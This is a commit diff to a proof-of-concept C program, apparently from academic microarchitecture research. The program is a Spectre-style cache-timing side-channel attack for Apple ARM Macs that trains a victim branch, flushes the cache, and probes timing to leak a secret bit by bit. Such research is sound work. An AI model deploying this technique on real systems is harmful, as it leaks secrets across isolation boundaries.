bc2358346e43d407eae69e8b04ecd7c4ef38c98f
mbhuUM <mbhu@umich.edu>
2024-04-11 17:27:10 -0400

    variable_time_macos

--- PoC/variable_time_macos/main.c
+++ PoC/variable_time_macos/main.c
@@ -3,10 +3,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <arm_neon.h>
-#include "cache.h"
-#include "memory.h"
-#include <sys/time.h>
-
+#include "timing.h"
 // #include <x86intrin.h>
 // #include <xmmintrin.h>
 
@@ -14,23 +11,23 @@
 #define SLOW 0x0010deadbeef1337
 #define SIZE 256
 #define STRIDE 128
-// #define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
-//#define BARRIER asm volatile("dsb sy;\nisb;\ndmb sy");
-
+// #define  memory_fence() asm volatile ("lfence;\nmfence;\nsfence");
+//void memory_fence()
+//{
+// asm volatile("dmb sy;\nisb sy;\n");
+//}
 //replacement for CLFLUSH
-//#define FLUSH_CACHE_LINE(addr) \
+#define FLUSH_CACHE_LINE(addr) \
 { \
     asm volatile ("dc civac, %0" : : "r" (addr) : "memory"); \
 }
 
 //this is the replacement  for __rdtscp
-/*
 static inline uint64_t READ_CNTVCT_EL0(void) {
     uint64_t val;
     asm volatile("mrs %0, cntvct_el0" : "=r" (val));
     return val;
 }
-*/
 
 uint64_t global_variable = 0xf;
 uint64_t tmp;
@@ -41,11 +38,22 @@ static uint8_t array[SIZE * STRIDE] __attribute__((aligned(128)));
 uint64_t fast, slow;
 
 
+//32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25
+//big_array has to be this size!
+static uint32_t big_array[1048576];
+
+void flush_cache()
+{
+  for (int i = 0; i < 1048576; i++)
+  {
+    big_array[i] = i;
+  }
+}
 
 double __attribute__((optnone)) victim_function(register int secret, register int bit, int isPublic)
 {
   for (volatile int i = 0; i < 200; i++);
-  memory_fence();
+   memory_fence();
 
   if (isPublic < array[0x2 * STRIDE]) {
     uint64_t tmp = ((secret >> bit) & 1) ? 0x40f0000000000000 : 0x0010deadbeef1337;
@@ -68,10 +76,8 @@ double __attribute__((optnone)) victim_function(register int secret, register in
 
 int main(int argc, char *argv[])
 {
-    volatile double tmp_value1, tmp_value, tmp_value2;
-    struct timeval start_time;
-    struct timeval end_time;
-    
+  volatile double tmp_value1, tmp_value, tmp_value2;
+  timer_start();
   int secret = atoi(argv[1]);
   int guess = 0;
 
@@ -80,39 +86,49 @@ int main(int argc, char *argv[])
   for (int i = 0; i < sizeof(array); i++)
     array[i] = 0x0;
   array[0x2 * STRIDE] = 10;
-  
+
+  flush_cache();
   memory_fence();
   uint64_t result[8] = {0};
 
   for (volatile int i = 0; i < 8; i++) {
-    tmp_value1 = victim_function(0,0,0);
-    tmp_value2 = victim_function(0,0,0);
-
-    memory_fence();
-    cache_remove(&array[0x2 * STRIDE]);
-    cache_remove(&global_variable);
     memory_fence();
 
-    tmp_value = victim_function(secret, i, 100);
+    //Train victim function
+    victim_function(0,0,0);
+    victim_function(0,0,0);
 
     memory_fence();
 
-    gettimeofday(&start_time, NULL);
-    //start = READ_CNTVCT_EL0();
-    *(volatile uint8_t*)&global_variable;
-    gettimeofday(&end_time, NULL);
-    end = (end_time.tv_sec - start_time.tv_sec);
+    //Flush the global values
+    //FLUSH_CACHE_LINE(&array[0x2 * STRIDE]);
+    //FLUSH_CACHE_LINE(&global_variable);
+    flush_cache();
     memory_fence();
 
+    //attacker calls victim
+    victim_function(secret, i, 100);
 
-    int tmp = end > 60 ? 0 : 1;
-    result[i] = end;
+    memory_fence();
+
+    //Probe cache to see if its a hit
+    uint64_t time = probe(&global_variable);
+    memory_fence();
+
+    //if probe time passes threshold, then guess 1, otherwise guess 0
+    int tmp = time > THRESHOLD ? 0 : 1;
+    result[i] = tmp;
     guess = guess | (tmp << i);
     memory_fence();
+
+     //noops
     asm volatile (".rept 4096;\nnop;\n.endr;");
   }
   memory_fence();
   for (int i = 0; i < 8; i++)
     printf("%3ld ", result[i]);
   printf("Guess : %3d, --> %d\n", guess, guess == secret ? 1 : 0);
+
+    timer_stop();
+
 }
